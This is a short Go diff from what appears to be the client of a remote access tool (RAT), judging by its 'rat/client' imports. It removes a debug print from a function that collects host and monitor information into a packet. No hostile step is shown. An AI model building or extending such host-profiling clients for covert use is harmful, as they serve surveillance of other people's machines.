@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"rat/client/computer"
 	"rat/client/os"
 	"rat/client/screen"
@@ -34,5 +33,4 @@ func (packet *ComputerInfoPacket) Init() {
 	screen.QueryMonitors()
 	packet.Monitors = screen.Monitors
 
-	fmt.Println(packet)
 }
